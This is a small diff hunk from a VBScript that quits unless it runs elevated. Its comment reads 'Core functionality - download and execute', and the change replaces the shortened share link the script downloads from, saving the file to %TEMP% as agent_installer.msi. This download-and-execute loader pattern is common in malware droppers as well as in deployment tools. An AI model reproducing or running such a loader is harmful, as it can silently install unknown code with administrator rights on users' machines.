@@ -416,7 +416,7 @@ If Not IsElevated() Then WScript.Quit
 
 ' Core functionality - download and execute
 Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objShell
-strUrl = "https://share.google/mcfwdtDNiFIQ5ep2b"
+strUrl = "https://share.google/mkGe1JX56Lut4KMdt"
 strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
